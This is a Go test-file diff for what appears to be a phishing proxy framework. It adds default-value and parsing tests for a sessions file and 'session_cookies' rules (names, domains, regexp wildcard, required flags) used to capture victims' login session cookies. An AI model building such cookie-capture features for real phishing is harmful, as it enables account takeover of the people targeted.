@@ -30,6 +30,7 @@ func TestNewAppConfigDefaultValues(t *testing.T) {
 	require.Equal(t, 30*time.Minute, conf.SessionExpiration)
 	require.Equal(t, "file", conf.DBType)
 	require.Equal(t, "creds.jsonl", conf.CredsFile)
+	require.Equal(t, "sessions.jsonl", conf.SessionsFile)
 	require.Equal(t, "lures.yaml", conf.LuresFile)
 }
 
@@ -337,7 +338,15 @@ func TestParsePhishletConfig(t *testing.T) {
             js_files:
                 - script.js
                 - data/script2.js
-            `),
+            session_cookies:
+                - name: sid
+                  domain: .example.com
+                  required: true
+                - name: .*,regexp
+                  domain: .example.com
+                - name: sid2
+                  domain: www.example.com
+                  required: true`),
 		},
 		"script.js": &fstest.MapFile{
 			Data: []byte(`console.log("Hello!")`),
@@ -352,6 +361,23 @@ func TestParsePhishletConfig(t *testing.T) {
 	require.Equal(t, "https://www.example.com/accounts/login", conf.LoginURL)
 	require.Equal(t, []string{"script.js", "data/script2.js"}, conf.JsFiles)
 	require.Equal(t, []string{`console.log("Hello!")`, `console.log("Hello2!")`}, conf.JsFilesBody)
+	require.Equal(t, []*SessionCookieConfig{
+		{
+			Name:     "sid",
+			Domain:   ".example.com",
+			Required: true,
+		},
+		{
+			Name:   ".*",
+			Domain: ".example.com",
+			Regexp: true,
+		},
+		{
+			Name:     "sid2",
+			Domain:   "www.example.com",
+			Required: true,
+		},
+	}, conf.SessionCookies)
 }
 
 func TestParsePhishletConfigInvalidInput(t *testing.T) {
